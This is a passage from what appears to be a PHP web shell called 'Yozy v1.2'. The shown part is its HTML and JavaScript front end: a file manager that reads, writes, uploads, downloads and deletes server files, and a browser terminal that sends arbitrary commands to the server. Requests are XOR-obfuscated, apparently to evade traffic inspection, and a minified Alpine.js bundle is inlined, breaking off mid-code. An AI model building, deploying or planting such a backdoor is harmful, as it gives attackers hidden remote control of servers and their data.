                        placeholder="File content...">
                    </textarea>
                </div>
                <div class="modal-actions">
                    <button class="btn btn-secondary" @click="modals.edit = false">Cancel</button>
                    <button class="btn btn-success" @click="saveFile()">Save</button>
                </div>
            </div>
        </div>

        <!-- New File Modal -->
        <div class="modal" :class="{ 'active': modals.newFile }" @click.self="modals.newFile = false">
            <div class="modal-content">
                <div class="modal-header">
                    <h3 class="modal-title">Create New File</h3>
                </div>
                <div class="form-group">
                    <label class="form-label">File Name:</label>
                    <input type="text" class="form-input" x-model="newfileValue" placeholder="Enter file name">
                </div>
                <div class="modal-actions">
                    <button class="btn btn-secondary" @click="modals.newFile = false">Cancel</button>
                    <button class="btn btn-success" @click="confirmCreateFile()">Create</button>
                </div>
            </div>
        </div>

        <!-- Delete Confirmation Modal -->
        <div class="modal" :class="{ 'active': modals.delete }" @click.self="modals.delete = false">
            <div class="modal-content">
                <div class="modal-header">
                    <h3 class="modal-title">Confirm Delete</h3>
                    <p>Are you sure you want to delete <strong x-text="deletingItem ? deletingItem.name : ''"></strong>?</p>
                    <p style="color: #ef4444; font-size: 14px; margin-top: 10px;">This action cannot be undone.</p>
                </div>
                <div class="modal-actions">
                    <button class="btn btn-secondary" @click="modals.delete = false">Cancel</button>
                    <button class="btn btn-danger" @click="confirmDelete()">Delete</button>
                </div>
            </div>
        </div>

        <!-- Hidden file input for uploads -->
        <input type="file" x-ref="fileInput" multiple style="display: none" @change="handleFileUpload($event)">
    </div>
    <script>
        function fileManager() {
            return {
                key: '<?php echo $encryptionKey; ?>',
                currentPath: '<?php echo $currentPath; ?>',
                selfurl: window.location.pathname,
                files: [],
                loading: true,
                os: '<?php echo $os; ?>',

                terminalOpen: false,
                terminalOutput: `
                    <div class="terminal-welcome">
                        <div class="welcome-line">Yozy v1.2</div>
                        <div class="welcome-line">---</div>
                    </div>
                `,
                terminalCommand: '',
                terminalHistory: [],
                historyIndex: -1,

                modals: {
                    rename: false,
                    edit: false,
                    delete: false,
                    newFile: false
                },

                renameValue: '',
                editContent: '',
                editingFile: null,
                deletingItem: null,
                newfileValue: '',

                get sortedFiles() {
                    return [...this.files].sort((a, b) => {
                        if (a.type === 'folder' && b.type === 'file') return -1;
                        if (a.type === 'file' && b.type === 'folder') return 1;
                        return a.name.localeCompare(b.name);
                    });
                },

                get breadcrumbs() {
                    if (this.currentPath === '/') return [];

                    const parts = this.currentPath.split('/').filter(p => p !== '');
                    let path = '';

                    return parts.map(part => {
                        path += '/' + part;
                        return {
                            name: part,
                            path
                        };
                    });


                },

                get terminalPath() {
                    return this.currentPath === '/' ? '~' : this.currentPath.replace(/^\//, '~/');
                },

                padKey(key, length = 32) {
                    const keyBytes = new TextEncoder().encode(key);
                    const padded = new Uint8Array(length);
                    for (let i = 0; i < Math.min(keyBytes.length, length); i++) {
                        padded[i] = keyBytes[i];
                    }
                    return padded;
                },

                encryptData(plaintext) {
                    try {
                        const keyBytes = this.padKey(this.key);
                        const data = new TextEncoder().encode(plaintext);
                        const encrypted = new Uint8Array(data.length);

                        for (let i = 0; i < data.length; i++) {
                            encrypted[i] = data[i] ^ keyBytes[i % keyBytes.length];
                        }

                        return btoa(String.fromCharCode(...encrypted));
                    } catch (error) {
                        throw new Error('Encryption failed: ' + error.message);
                    }
                },

                async makeEncryptedRequest(data, isFormData = false) {
                    try {
                        if (isFormData) {
                            const response = await fetch(this.selfurl, {
                                method: 'POST',
                                body: data
                            });
                            return await response.json();
                        } else {
                            // Regular JSON requests - encrypt
                            const jsonData = JSON.stringify(data);
                            const encryptedData = await this.encryptData(jsonData);

                            const response = await fetch(this.selfurl, {
                                method: 'POST',
                                headers: {
                                    'Content-Type': 'text/plain'
                                },
                                body: 'ENCRYPTED:' + encryptedData
                            });

                            const responseText = await response.text();

                            return JSON.parse(responseText);
                        }
                    } catch (error) {
                        console.error('Request failed:', error);
                        return {
                            success: false,
                            error: error.message
                        };
                    }
                },

                // Methods
                init() {
                    this.loadFiles();
                },

                async loadFiles() {
                    this.loading = true;
                    try {
                        const response = await fetch(this.selfurl, {
                            method: 'POST',
                            headers: {
                                'Content-Type': 'application/json'
                            },
                            body: JSON.stringify({
                                action: 'list',
                                path: this.currentPath
                            })
                        });

                        const data = await response.json();

                        if (data.success) {
                            this.files = data.files;
                        } else {
                            console.error('Failed to load files:', data.error);
                        }
                    } catch (error) {
                        console.error('Error loading files:', error);
                    } finally {
                        this.loading = false;
                    }
                },

                async navigateTo(path) {

                    if (this.os === 'windows') {
                        if (path.startsWith('/')) {
                            path = path.substring(1);
                        }
                    }

                    this.currentPath = path;
                    await this.loadFiles();
                },

                getFileIcon(file) {
                    if (file.type === 'folder') return 'fas fa-folder';

                    const ext = file.name.split('.').pop().toLowerCase();
                    const iconMap = {
                        'txt': 'fas fa-file-alt',
                        'md': 'fab fa-markdown',
                        'js': 'fab fa-js-square',
                        'css': 'fab fa-css3-alt',
                        'html': 'fab fa-html5',
                        'php': 'fab fa-php',
                        'jpg': 'fas fa-file-image',
                        'jpeg': 'fas fa-file-image',
                        'png': 'fas fa-file-image',
                        'gif': 'fas fa-file-image',
                        'pdf': 'fas fa-file-pdf',
                        'doc': 'fas fa-file-word',
                        'docx': 'fas fa-file-word',
                        'xls': 'fas fa-file-excel',
                        'xlsx': 'fas fa-file-excel',
                        'zip': 'fas fa-file-archive',
                        'rar': 'fas fa-file-archive'
                    };
                    return iconMap[ext] || 'fas fa-file';
                },

                formatPermissions(permissions) {
                    if (!permissions) return '<span style="color: #94a3b8;">-</span>';

                    const createGroup = (label, perms) => {
                        const indicators = ['r', 'w', 'x'].map((perm, index) => {
                            const hasPermission = perms[index] !== '-';
                            const className = hasPermission ? 'granted' : 'denied';
                            return `<div class="permission-indicator ${className}" title="${perm.toUpperCase()}: ${hasPermission ? 'Granted' : 'Denied'}">${hasPermission ? perm.toUpperCase() : '-'}</div>`;
                        }).join('');

                        return `
                            <div class="permission-group">
                                <div class="permission-label">${label}</div>
                                <div class="permission-indicators">${indicators}</div>
                            </div>
                        `;
                    };

                    return `
                        <div class="permissions-display">
                            ${createGroup('Own', permissions.owner)}
                            ${createGroup('Grp', permissions.group)}
                            ${createGroup('Oth', permissions.other)}
                        </div>
                    `;
                },

                // File Operations
                async createFolder() {
                    const name = prompt('Enter folder name:');
                    if (!name) return;

                    try {
                        const data = await this.makeEncryptedRequest({
                            action: 'mkdir',
                            path: this.currentPath,
                            name: name
                        });

                        if (data.success) {
                            await this.loadFiles();
                            this.appendToTerminal(`<div class="command-success">Directory created: ${name}</div>`);
                        } else {
                            alert('Error creating folder: ' + data.error);
                        }
                    } catch (error) {
                        console.error('Error creating folder:', error);
                    }
                },

                uploadFile() {
                    this.$refs.fileInput.click();
                },

                async handleFileUpload(event) {
                    const files = event.target.files;
                    if (!files.length) return;

                    const formData = new FormData();
                    formData.append('action', 'upload');
                    formData.append('path', this.currentPath);

                    for (let i = 0; i < files.length; i++) {
                        formData.append('files[]', files[i]);
                    }

                    try {
                        const data = await this.makeEncryptedRequest(formData, true);
                        if (data.success) {
                            await this.loadFiles();
                            this.appendToTerminal(`<div class="command-success">Files uploaded successfully</div>`);
                        } else {
                            alert('Error uploading files: ' + data.error);
                        }
                    } catch (error) {
                        console.error('Error uploading files:', error);
                    }

                    event.target.value = '';
                },

                async editFile(file) {
                    this.editingFile = file;

                    try {
                        const data = await this.makeEncryptedRequest({
                            action: 'read',
                            path: file.path
                        });

                        if (data.success) {
                            this.editContent = data.content;
                            this.modals.edit = true;
                        } else {
                            alert('Error reading file: ' + data.error);
                        }
                    } catch (error) {
                        console.error('Error reading file:', error);
                    }
                },

                async saveFile() {
                    if (!this.editingFile) return;

                    try {
                        const data = await this.makeEncryptedRequest({
                            action: 'write',
                            path: this.editingFile.path,
                            content: this.editContent
                        });

                        if (data.success) {
                            this.modals.edit = false;
                            this.appendToTerminal(`<div class="command-success">File saved: ${this.editingFile.name}</div>`);
                        } else {
                            alert('Error saving file: ' + data.error);
                        }
                    } catch (error) {
                        console.error('Error saving file:', error);
                    }
                },

                async downloadFile(file) {
                    try {
                        const data = await this.makeEncryptedRequest({
                            action: 'download',
                            path: file.path
                        });
                        if (data.success && data.content) {
                            const link = document.createElement('a');
                            link.href = 'data:application/octet-stream;base64,' + data.content;
                            link.download = file.name;
                            document.body.appendChild(link);
                            link.click();
                            document.body.removeChild(link);
                            this.appendToTerminal(`<div class="command-success">File downloaded: ${file.name}</div>`);
                        } else {
                            alert('Error downloading file: ' + data.error);
                        }
                    } catch (error) {
                        console.error('Error downloading file:', error);
                        return;
                    }
                },

                renameItem(item) {
                    this.deletingItem = item;
                    this.renameValue = item.name;
                    this.modals.rename = true;
                },

                createFile() {
                    this.newfileValue = '';
                    this.modals.newFile = true;
                },

                async confirmRename() {
                    if (!this.deletingItem || !this.renameValue) return;

                    try {
                        const data = await this.makeEncryptedRequest({
                            action: 'rename',
                            oldPath: this.deletingItem.path,
                            newName: this.renameValue
                        });

                        if (data.success) {
                            this.modals.rename = false;
                            await this.loadFiles();
                            this.appendToTerminal(`<div class="command-success">Renamed ${this.deletingItem.name} to ${this.renameValue}</div>`);
                        } else {
                            alert('Error renaming item: ' + data.error);
                        }
                    } catch (error) {
                        console.error('Error renaming item:', error);
                    }
                },

                async confirmCreateFile() {
                    if (!this.newfileValue) return;

                    try {
                        const data = await this.makeEncryptedRequest({
                            action: 'touch',
                            path: this.currentPath,
                            name: this.newfileValue
                        });
                        if (data.success) {
                            this.modals.newFile = false;
                            await this.loadFiles();
                            this.appendToTerminal(`<div class="command-success">File created: ${this.newfileValue}</div>`);
                        } else {
                            alert('Error creating file: ' + data.error);
                        }
                    } catch (error) {
                        console.error('Error creating file:', error);
                    }
                },

                deleteItem(item) {
                    this.deletingItem = item;
                    this.modals.delete = true;
                },

                async confirmDelete() {
                    if (!this.deletingItem) return;

                    try {
                        const data = await this.makeEncryptedRequest({
                            action: 'delete',
                            path: this.deletingItem.path
                        });

                        if (data.success) {
                            this.modals.delete = false;
                            await this.loadFiles();
                            this.appendToTerminal(`<div class="command-success">Deleted: ${this.deletingItem.name}</div>`);
                        } else {
                            alert('Error deleting item: ' + data.error);
                        }
                    } catch (error) {
                        console.error('Error deleting item:', error);
                    }
                },

                // Terminal Functions
                toggleTerminal() {
                    this.terminalOpen = !this.terminalOpen;
                    if (this.terminalOpen) {
                        this.$nextTick(() => {
                            this.$refs.terminalInput.focus();
                        });
                    }
                },

                async executeCommand() {
                    const command = this.terminalCommand.trim();
                    if (!command) return;

                    // Add to history
                    this.terminalHistory.push(command);
                    this.historyIndex = this.terminalHistory.length;

                    // Display command
                    this.appendToTerminal(`<div class="command-line"><span style="color: #10b981;">yozy@xoxo</span>:<span style="color: #fbbf24;">${this.terminalPath}</span>$ ${command}</div>`);

                    // Execute command
                    await this.processCommand(command);

                    this.terminalCommand = '';
                    this.scrollTerminalToBottom();
                },

                async processCommand(command) {
                    const parts = command.split(' ');
                    const cmd = parts[0].toLowerCase();
                    const args = parts.slice(1);

                    try {
                        const data = await this.makeEncryptedRequest({
                            action: 'terminal',
                            cmd: (cmd === 'cd') ? cmd : command,
                            args: (cmd === 'cd') ? args : null,
                            path: this.currentPath
                        });

                        if (data.success) {
                            if (data.output) {
                                this.appendToTerminal(data.output);
                            }

                            // Handle special commands
                            if (cmd === 'cd' && data.newPath) {
                                this.currentPath = data.newPath;
                                await this.loadFiles();
                            } else if (['mkdir', 'rmdir', 'rm', 'touch'].includes(cmd)) {
                                await this.loadFiles();
                            } else if (cmd === 'clear') {
                                this.clearTerminal();
                                return;
                            }
                        } else {
                            this.appendToTerminal(`<div class="command-error">${data.error}</div>`);
                        }
                    } catch (error) {
                        console.error('Terminal command error:', error);
                        this.appendToTerminal(`<div class="command-error">Network error: ${error.message}</div>`);
                    }
                },

                clearTerminal() {
                    this.terminalOutput = `
                        <div class="terminal-welcome">
                            <div class="welcome-line">Yozy v1.2</div>
                            <div class="welcome-line">---</div>
                        </div>
                    `;
                },

                appendToTerminal(html) {
                    this.terminalOutput += html;
                    this.$nextTick(() => this.scrollTerminalToBottom());
                },

                scrollTerminalToBottom() {
                    const output = this.$refs.terminalOutput;
                    if (output) {
                        output.scrollTop = output.scrollHeight;
                    }
                },

                navigateHistory(direction) {
                    if (this.terminalHistory.length === 0) return;

                    this.historyIndex += direction;

                    if (this.historyIndex < 0) {
                        this.historyIndex = 0;
                    } else if (this.historyIndex >= this.terminalHistory.length) {
                        this.historyIndex = this.terminalHistory.length;
                        this.terminalCommand = '';
                        return;
                    }

                    this.terminalCommand = this.terminalHistory[this.historyIndex] || '';
                }
            }
        }
    </script>
    <script defer>
    (()=>{var ee=!1,re=!1,W=[],ne=-1,ie=!1;function Ve(t){Dn(t)}function Ue(){ie=!0}function qe(){ie=!1,We()}function Dn(t){W.includes(t)||W.push(t),We()}function Ke(t){let e=W.indexOf(t);e!==-1&&e>ne&&W.splice(e,1)}function We(){if(!re&&!ee){if(ie)return;ee=!0,queueMicrotask(In)}}function In(){ee=!1,re=!0;for(let t=0;t<W.length;t++)W[t](),ne=t;W.length=0,ne=-1,re=!1}var C,R,j,se,oe=!0;function Ge(t){oe=!1,t(),oe=!0}function Je(t){C=t.reactive,j=t.release,R=e=>t.effect(e,{scheduler:r=>{oe?Ve(r):r()}}),se=t.raw}function ae(t){R=t}function Ye(t){let e=()=>{};return[n=>{let i=R(n);return t._x_effects||(t._x_effects=new Set,t._x_runEffects=()=>{t._x_effects.forEach(o=>o())}),t._x_effects.add(i),e=()=>{i!==void 0&&(t._x_effects.delete(i),j(i))},i},()=>{e()}]}function St(t,e){let r=!0,n,i,o=R(()=>{let s=t(),a=JSON.stringify(s);if(!r&&(typeof s=="object"||s!==n)){let c=typeof n=="object"?JSON.parse(i):n;queueMicrotask(()=>{e(s,c)})}n=s,i=a,r=!1});return()=>j(o)}async function Xe(t){Ue();try{await t(),await Promise.resolve()}finally{qe()}}var Ze=[],Qe=[],tr=[];function er(t){tr.push(t)}function et(t,e){typeof e=="function"?(t._x_cleanups||(t._x_cleanups=[]),t._x_cleanups.push(e)):(e=t,Qe.push(e))}function At(t){Ze.push(t)}function Ot(t,e,r){t._x_attributeCleanups||(t._x_attributeCleanups={}),t._x_attributeCleanups[e]||(t._x_attributeCleanups[e]=[]),t._x_attributeCleanups[e].push(r)}function ce(t,e){t._x_attributeCleanups&&Object.entries(t._x_attributeCleanups).forEach(([r,n])=>{(e===void 0||e.includes(r))&&(n.forEach(i=>i()),delete t._x_attributeCleanups[r])})}function rr(t){for(t._x_effects?.forEach(Ke);t._x_cleanups?.length;)t._x_cleanups.pop()()}var le=new MutationObserver(pe),ue=!1;function ut(){le.observe(document,{subtree:!0,childList:!0,attributes:!0,attributeOldValue:!0}),ue=!0}function fe(){kn(),le.disconnect(),ue=!1}var lt=[];function kn(){let t=le.takeRecords();lt.push(()=>t.length>0&&pe(t));let e=lt.length;queueMicrotask(()=>{if(lt.length===e)for(;lt.length>0;)lt.shift()()})}function m(t){if(!ue)return t();fe();let e=t();return ut(),e}var de=!1,vt=[];function nr(){de=!0}function ir(){de=!1,pe(vt),vt=[]}function pe(t){if(de){vt=vt.concat(t);return}let e=[],r=new Set,n=new Map,i=new Map;for(let o=0;o<t.length;o++)if(!t[o].target._x_ignoreMutationObserver&&(t[o].type==="childList"&&(t[o].removedNodes.forEach(s=>{s.nodeType===1&&s._x_marker&&r.add(s)}),t[o].addedNodes.forEach(s=>{if(s.nodeType===1){if(r.has(s)){r.delete(s);return}s._x_marker||e.push(s)}})),t[o].type==="attributes")){let s=t[o].target,a=t[o].attributeName,c=t[o].oldValue,l=()=>{n.has(s)||n.set(s,[]),n.get(s).push({name:a,value:s.getAttribute(a)})},u=()=>{i.has(s)||i.set(s,[]),i.get(s).push(a)};s.hasAttribute(a)&&c===null?l():s.hasAttribute(a)?(u(),l()):u()}i.forEach((o,s)=>{ce(s,o)}),n.forEach((o,s)=>{Ze.forEach(a=>a(s,o))});for(let o of r)e.some(s=>s.contains(o))||Qe.forEach(s=>s(o));for(let o of e)o.isConnected&&tr.forEach(s=>s(o));e=null,r=null,n=null,i=null}function Ct(t){return P(F(t))}function N(t,e,r){return t._x_dataStack=[e,...F(r||t)],()=>{t._x_dataStack=t._x_dataStack.filter(n=>n!==e)}}function F(t){return t._x_dataStack?t._x_dataStack:typeof ShadowRoot=="function"&&t instanceof ShadowRoot?F(t.host):t.parentNode?F(t.parentNode):[]}function P(t){return new Proxy({objects:t},$n)}function or(t,e){return t===null||t===Object.prototype?null:Object.prototype.hasOwnProperty.call(t,e)?t:or(Object.getPrototypeOf(t),e)}var $n={ownKeys({objects:t}){return Array.from(new Set(t.flatMap(e=>Object.keys(e))))},has({objects:t},e){return e==Symbol.unscopables?!1:t.some(r=>Object.prototype.hasOwnProperty.call(r,e)||Reflect.has(r,e))},get({objects:t},e,r){return e=="toJSON"?Ln:Reflect.get(t.find(n=>Reflect.has(n,e))||{},e,r)},set({objects:t},e,r,n){let i;for(let s of t)if(i=or(s,e),i)break;i||(i=t[t.length-1]);let o=Object.getOwnPropertyDescriptor(i,e);return o?.set&&o?.get?o.set.call(n,r)||!0:Reflect.set(i,e,r)}};function Ln(){return Reflect.ownKeys(this).reduce((e,r)=>(e[r]=Reflect.get(this,r),e),{})}function rt(t){let e=n=>typeof n=="object"&&!Array.isArray(n)&&n!==null,r=(n,i="")=>{Object.entries(Object.getOwnPropertyDescriptors(n)).forEach(([o,{value:s,enumerable:a}])=>{if(a===!1||s===void 0||typeof s=="object"&&s!==null&&s.__v_skip)return;let c=i===""?o:`${i}.${o}`;typeof s=="object"&&s!==null&&s._x_interceptor?n[o]=s.initialize(t,c,o):e(s)&&s!==n&&!(s instanceof Element)&&r(s,c)})};return r(t)}function Tt(t,e=()=>{}){let r={initialValue:void 0,_x_interceptor:!0,initialize(n,i,o){return t(this.initialValue,()=>jn(n,i),s=>me(n,i,s),i,o)}};return e(r),n=>{if(typeof n=="object"&&n!==null&&n._x_interceptor){let i=r.initialize.bind(r);r.initialize=(o,s,a)=>{let c=n.initialize(o,s,a);return r.initialValue=c,i(o,s,a)}}else r.initialValue=n;return r}}function jn(t,e){return e.split(".").reduce((r,n)=>r[n],t)}function me(t,e,r){if(typeof e=="string"&&(e=e.split(".")),e.length===1)t[e[0]]=r;else{if(e.length===0)throw error;return t[e[0]]||(t[e[0]]={}),me(t[e[0]],e.slice(1),r)}}var sr={};function x(t,e){sr[t]=e}function H(t,e){let r=Fn(e);return Object.entries(sr).forEach(([n,i])=>{Object.defineProperty(t,`$${n}`,{get(){return i(e,r)},enumerable:!1})}),t}function Fn(t){let[e,r]=he(t),n={interceptor:Tt,...e};return et(t,r),n}function ar(t,e,r,...n){try{return r(...n)}catch(i){nt(i,t,e)}}function nt(...t){return cr(...t)}var cr=Bn;function lr(t){cr=t}function Bn(t,e,r=void 0){t=Object.assign(t??{message:"No error message given."},{el:e,expression:r}),console.warn(`Alpine Expression Error: ${t.message}${r?'Expression: "'+r+`"`:""}`,e),setTimeout(()=>{throw t},0)}var it=!0;function Mt(t){let e=it;it=!1;let r=t();return it=e,r}function T(t,e,r={}){let n;return _(t,e)(i=>n=i,r),n}function _(...t){return ur(...t)}var ur=()=>{};function fr(t){ur=t}var dr;function pr(t){dr=t}function mr(t,e){let r={};H(r,t);let n=[r,...F(t)],i=typeof e=="function"?zn(n,e):Vn(n,e,t);return ar.bind(null,t,e,i)}function zn(t,e){return(r=()=>{},{scope:n={},params:i=[],context:o}={})=>{if(!it){ft(r,e,P([n,...t]),i);return}let s=e.apply(P([n,...t]),i);ft(r,s)}}var _e={};function Hn(t,e){if(_e[t])return _e[t];let r=Object.getPrototypeOf(async function(){}).constructor,n=/^[\n\s]*if.*\(.*\)/.test(t.trim())||/^(let|const)\s/.test(t.trim())?`(async()=>{ ${t} })()`:t,o=(()=>{try{let s=new r(["__self","scope"],`with (scope) { __self.result = ${n} }; __self.finished = true; return __self.result;`);return Object.defineProperty(s,"name",{value:`[Alpine] ${t}`}),s}catch(s){return nt(s,e,t),Promise.resolve()}})();return _e[t]=o,o}function Vn(t,e,r){let n=Hn(e,r);return(i=()=>{},{scope:o={},params:s=[],context:a}={})=>{n.result=void 0,n.finished=!1;let c=P([o,...t]);if(typeof n=="function"){let l=n.call(a,n,c).catch(u=>nt(u,r,e));n.finished?(ft(i,n.result,c,s,r),n.result=void 0):l.then(u=>{ft(i,u,c,s,r)}).catch(u=>nt(u,r,e)).finally(()=>n.result=void 0)}}}function ft(t,e,r,n,i){if(it&&typeof e=="function"){let o=e.apply(r,n);o instanceof Promise?o.then(s=>ft(t,s,r,n)).catch(s=>nt(s,i,e)):t(o)}else typeof e=="object"&&e instanceof Promise?e.then(o=>t(o)):t(e)}function hr(...t){return dr(...t)}function _r(t,e,r={}){let n={};H(n,t);let i=[n,...F(t)],o=P([r.scope??{},...i]),s=r.params??[];if(e.includes("await")){let a=Object.getPrototypeOf(async function(){}).constructor,c=/^[\n\s]*if.*\(.*\)/.test(e.trim())||/^(let|const)\s/.test(e.trim())?`(async()=>{ ${e} })()`:e;return new a(["scope"],`with (scope) { let __result = ${c}; return __result }`).call(r.context,o)}else{let a=/^[\n\s]*if.*\(.*\)/.test(e.trim())||/^(let|const)\s/.test(e.trim())?`(()=>{ ${e} })()`:e,l=new Function(["scope"],`with (scope) { let __result = ${a}; return __result }`).call(r.context,o);return typeof l=="function"&&it?l.apply(o,s):l}}var ye="x-";function O(t=""){return ye+t}function gr(t){ye=t}var Rt={};function p(t,e){return Rt[t]=e,{before(r){if(!Rt[r]){console.warn(String.raw`Cannot find directive \`${r}\`. \`${t}\` will use the default order of execution`);return}let n=G.indexOf(r);G.splice(n>=0?n:G.indexOf("DEFAULT"),0,t)}}}function xr(t){return Object.keys(Rt).includes(t)}function pt(t,e,r){if(e=Array.from(e),t._x_virtualDirectives){let o=Object.entries(t._x_virtualDirectives).map(([a,c])=>({name:a,value:c})),s=be(o);o=o.map(a=>s.find(c=>c.name===a.name)?{name:`x-bind:${a.name}`,value:`"${a.value}"`}:a),e=e.concat(o)}let n={};return e.map(wr((o,s)=>n[o]=s)).filter(Sr).map(qn(n,r)).sort(Kn).map(o=>Un(t,o))}function be(t){return Array.from(t).map(wr()).filter(e=>!Sr(e))}var ge=!1,dt=new Map,yr=Symbol();function br(t){ge=!0;let e=Symbol();yr=e,dt.set(e,[]);let r=()=>{for(;dt.get(e).length;)dt.get(e).shift()();dt.delete(e)},n=()=>{ge=!1,r()};t(r),n()}function he(t){let e=[],r=a=>e.push(a),[n,i]=Ye(t);return e.push(i),[{Alpine:B,effect:n,cleanup:r,evaluateLater:_.bind(_,t),evaluate:T.bind(T,t)},()=>e.forEach(a=>a())]}function Un(t,e){let r=()=>{},n=Rt[e.type]||r,[i,o]=he(t);Ot(t,e.original,o);let s=()=>{t._x_ignore||t._x_ignoreSelf||(n.inline&&n.inline(t,e,i),n=n.bind(n,t,e,i),ge?dt.get(yr).push(n):n())};return s.runCleanups=o,s}var Nt=(t,e)=>({name:r,value:n})=>(r.startsWith(t)&&(r=r.replace(t,e)),{name:r,value:n}),Pt=t=>t;function wr(t=()=>{}){return({name:e,value:r})=>{let{name:n,value:i}=Er.reduce((o,s)=>s(o),{name:e,value:r});return n!==e&&t(n,e),{name:n,value:i}}}var Er=[];function ot(t){Er.push(t)}function Sr({name:t}){return vr().test(t)}var vr=()=>new RegExp(`^${ye}([^:^.]+)\\b`);function qn(t,e){return({name:r,value:n})=>{r===n&&(n="");let i=r.match(vr()),o=r.match(/:([a-zA-Z0-9\-_:]+)/),s=r.match(/\.[^.\]]+(?=[^\]]*$)/g)||[],a=e||t[r]||r;return{type:i?i[1]:null,value:o?o[1]:null,modifiers:s.map(c=>c.replace(".","")),expression:n,original:a}}}var xe="DEFAULT",G=["ignore","ref","id","data","anchor","bind","init","for","model","modelable","transition","show","if",xe,"teleport"];function Kn(t,e){let r=G.indexOf(t.type)===-1?xe:t.type,n=G.indexOf(e.type)===-1?xe:e.type;return G.indexOf(r)-G.indexOf(n)}function J(t,e,r={},n={}){return t.dispatchEvent(new CustomEvent(e,{detail:r,bubbles:!0,composed:!0,cancelable:!0,...n}))}function D(t,e){if(typeof ShadowRoot=="function"&&t instanceof ShadowRoot){Array.from(t.children).forEach(i=>D(i,e));return}let r=!1;if(e(t,()=>r=!0),r)return;let n=t.firstElementChild;for(;n;)D(n,e,!1),n=n.nextElementSibling}function E(t,...e){console.warn(`Alpine Warning: ${t}`,...e)}var Ar=!1;function Or(){Ar&&E("Alpine has already been initialized on this page. Calling Alpine.start() more than once can cause problems."),Ar=!0,document.body||E("Unable to initialize. Trying to load Alpine before `<body>` is available. Did you forget to add `defer` in Alpine's `<script>` tag?"),J(document,"alpine:init"),J(document,"alpine:initializing"),ut(),er(e=>S(e,D)),et(e=>I(e)),At((e,r)=>{pt(e,r).forEach(n=>n())});let t=e=>!Y(e.parentElement,!0);Array.from(document.querySelectorAll(Mr().join(","))).filter(t).forEach(e=>{S(e)}),J(document,"alpine:initialized"),setTimeout(()=>{Gn()})}var we=[],Cr=[];function Tr(){return we.map(t=>t())}function Mr(){return we.concat(Cr).map(t=>t())}function Dt(t){we.push(t)}function It(t){Cr.push(t)}function Y(t,e=!1){return A(t,r=>{if((e?Mr():Tr()).some(i=>r.matches(i)))return!0})}function A(t,e){if(t){if(e(t))return t;if(t._x_teleportBack)return A(t._x_teleportBack,e);if(t.parentNode instanceof ShadowRoot)return A(t.parentNode.host,e);if(t.parentElement)return A(t.parentElement,e)}}function Rr(t){return Tr().some(e=>t.matches(e))}var Nr=[];function Pr(t){Nr.push(t)}var Wn=1;function S(t,e=D,r=()=>{}){A(t,n=>n._x_ignore)||br(()=>{e(t,(n,i)=>{n._x_marker||(r(n,i),Nr.forEach(o=>o(n,i)),pt(n,n.attributes).forEach(o=>o()),n._x_ignore||(n._x_marker=Wn++),n._x_ignore&&i())})})}function I(t,e=D){e(t,r=>{rr(r),ce(r),delete r._x_marker})}function Gn(){[["ui","dialog",["[x-dialog], [x-popover]"]],["anchor","anchor",["[x-anchor]"]],["sort","sort",["[x-sort]"]]].forEach(([e,r,n])=>{xr(r)||n.some(i=>{if(document.querySelector(i))return E(`found "${i}", but missing ${e} plugin`),!0})})}var Ee=[],Se=!1;function st(t=()=>{}){return queueMicrotask(()=>{Se||setTimeout(()=>{kt()})}),new Promise(e=>{Ee.push(()=>{t(),e()})})}function kt(){for(Se=!1;Ee.length;)Ee.shift()()}function Dr(){Se=!0}function mt(t,e){return Array.isArray(e)?Ir(t,e.join(" ")):typeof e=="object"&&e!==null?Jn(t,e):typeof e=="function"?mt(t,e()):Ir(t,e)}function ve(t){return t.split(/\s/).filter(Boolean)}function Ir(t,e){let r=i=>ve(i).filter(o=>!t.classList.contains(o)).filter(Boolean),n=i=>(t.classList.add(...i),()=>{t.classList.remove(...i)});return e=e===!0?e="":e||"",n(r(e))}function Jn(t,e){let r=Object.entries(e).flatMap(([s,a])=>a?ve(s):!1).filter(Boolean),n=Object.entries(e).flatMap(([s,a])=>a?!1:ve(s)).filter(Boolean),i=[],o=[];return n.forEach(s=>{t.classList.contains(s)&&(t.classList.remove(s),o.push(s))}),r.forEach(s=>{t.classList.contains(s)||(t.classList.add(s),i.push(s))}),()=>{o.forEach(s=>t.classList.add(s)),i.forEach(s=>t.classList.remove(s))}}function X(t,e){return typeof e=="object"&&e!==null?Yn(t,e):Xn(t,e)}function Yn(t,e){let r={};return Object.entries(e).forEach(([n,i])=>{r[n]=t.style[n],n.startsWith("--")||(n=Zn(n)),t.style.setProperty(n,i)}),setTimeout(()=>{t.style.length===0&&t.removeAttribute("style")}),()=>{X(t,r)}}function Xn(t,e){let r=t.getAttribute("style",e);return t.setAttribute("style",e),()=>{t.setAttribute("style",r||"")}}function Zn(t){return t.replace(/([a-z])([A-Z])/g,"$1-$2").toLowerCase()}function ht(t,e=()=>{}){let r=!1;return function(){r?e.apply(this,arguments):(r=!0,t.apply(this,arguments))}}p("transition",(t,{value:e,modifiers:r,expression:n},{evaluate:i})=>{typeof n=="function"&&(n=i(n)),n!==!1&&(!n||typeof n=="boolean"?ti(t,r,e):Qn(t,n,e))});function Qn(t,e,r){kr(t,mt,""),{enter:i=>{t._x_transition.enter.during=i},"enter-start":i=>{t._x_transition.enter.start=i},"enter-end":i=>{t._x_transition.enter.end=i},leave:i=>{t._x_transition.leave.during=i},"leave-start":i=>{t._x_transition.leave.start=i},"leave-end":i=>{t._x_transition.leave.end=i}}[r](e)}function ti(t,e,r){kr(t,X);let n=!e.includes("in")&&!e.includes("out")&&!r,i=n||e.includes("in")||["enter"].includes(r),o=n||e.includes("out")||["leave"].includes(r);e.includes("in")&&!n&&(e=e.filter((w,tt)=>tt<e.indexOf("out"))),e.includes("out")&&!n&&(e=e.filter((w,tt)=>tt>e.indexOf("out")));let s=!e.includes("opacity")&&!e.includes("scale"),a=s||e.includes("opacity"),c=s||e.includes("scale"),l=a?0:1,u=c?_t(e,"scale",95)/100:1,f=_t(e,"delay",0)/1e3,b=_t(e,"origin","center"),g="opacity, transform",L=_t(e,"duration",150)/1e3,d=_t(e,"duration",75)/1e3,y="cubic-bezier(0.4, 0.0, 0.2, 